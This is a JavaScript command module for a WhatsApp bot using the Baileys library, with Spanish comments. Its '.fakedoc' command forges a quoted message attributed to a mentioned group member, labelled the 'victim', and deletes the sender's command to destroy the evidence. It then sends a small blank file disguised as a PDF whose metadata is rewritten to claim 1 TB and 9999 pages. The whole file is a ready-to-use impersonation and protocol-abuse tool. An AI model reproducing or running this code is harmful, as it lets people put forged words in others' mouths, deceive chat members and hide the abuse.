import { generateWAMessageFromContent, prepareWAMessageMedia } from '@whiskeysockets/baileys';

export default {
    name: 'suplantacion_documento',
    match: (text) => /^\.fakedoc\s+/i.test(text),
    execute: async ({ sock, remitente, msg, textoLimpio }) => {
        
        const isGroup = remitente.endsWith('@g.us');
        if (!isGroup) return sock.sendMessage(remitente, { text: "❌ Este exploit solo tiene sentido en grupos." }, { quoted: msg });

        const mentionedJid = msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedJid) return sock.sendMessage(remitente, { text: "❌ Menciona a la víctima. Ej: .fakedoc @user pásame el archivo" });

        let textoFalso = textoLimpio.replace(/^\.fakedoc\s+/i, '').replace(/@\d+/g, '').trim();
        if (!textoFalso) textoFalso = "¿Tienes el trabajo de física listo?";

        try {
            // 1. Destrucción de la evidencia
            try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}

            // 2. Construcción de la cita fantasma
            const mensajeInyectado = {
                key: {
                    fromMe: false,
                    participant: mentionedJid,
                    id: "3EB0" + Date.now().toString(16).toUpperCase()
                },
                message: { conversation: textoFalso }
            };

            // 3. Generamos un documento minúsculo real (12 KB) para no quemar la RAM de tu VPS
            const corruptBuffer = Buffer.alloc(12 * 1024);

            // 4. Pre-subida silenciosa a los servidores de WhatsApp
            const media = await prepareWAMessageMedia(
                { 
                    document: corruptBuffer, 
                    fileName: "Trabajo Fisica.pdf", 
                    mimetype: "application/pdf" 
                },
                { upload: sock.waUploadToServer }
            );

            // 5. EXPLOIT DE PROTOCOLO: Modificación cruda de metadatos
            // 1 Terabyte = 1099511627776 bytes
            media.documentMessage.fileLength = "1099511627776"; 
            media.documentMessage.pageCount = 9999; // Mentimos sobre la cantidad de páginas

            // 6. Empaquetado final y envío del mensaje interceptado
            const waMsg = generateWAMessageFromContent(remitente, {
                documentMessage: media.documentMessage
            }, { quoted: mensajeInyectado });

            await sock.relayMessage(remitente, waMsg.message, { messageId: waMsg.key.id });

        } catch (err) {
            console.error("Error Fake Doc:", err);
            await sock.sendMessage(remitente, { text: `❌ Fallo en la inyección de metadatos: ${err.message}` });
        }
    }
};
